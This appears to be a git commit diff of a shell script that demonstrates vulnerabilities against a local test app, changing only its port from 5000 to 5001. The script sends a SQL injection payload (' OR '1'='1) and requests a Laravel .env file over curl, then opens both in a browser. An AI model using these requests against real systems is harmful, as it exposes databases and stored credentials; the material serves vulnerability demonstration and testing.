d68a65a06b1532b6f26dedeb64d35db046c2f72a
ryan1640 <ryan@nightvision.net>
2024-09-16 09:37:26 -0400

    Update check-endpoint.sh

--- check-endpoint.sh
+++ check-endpoint.sh
@@ -1,15 +1,15 @@
 echo "==========================================="
 echo "SQL INJECTION"
-echo "curl \"http://127.0.0.1:5000/users?name='%20OR%20'1'='1\""
+echo "curl \"http://127.0.0.1:5001/users?name='%20OR%20'1'='1\""
 echo
-curl "http://127.0.0.1:5000/users?name='%20OR%20'1'='1"
+curl "http://127.0.0.1:5001/users?name='%20OR%20'1'='1"
 echo 
 echo "==========================================="
 echo "Laravel - Sensitive Information Disclosure"
-echo 'curl http://127.0.0.1:5000/.env'
+echo 'curl http://127.0.0.1:5001/.env'
 echo
-curl http://127.0.0.1:5000/.env
+curl http://127.0.0.1:5001/.env
 
 read
-open -a Google\ Chrome "http://127.0.0.1:5000/.env" &
-open -a Google\ Chrome "http://127.0.0.1:5000/users?name='%20OR%20'1'='1" &
+open -a Google\ Chrome "http://127.0.0.1:5001/.env" &
+open -a Google\ Chrome "http://127.0.0.1:5001/users?name='%20OR%20'1'='1" &
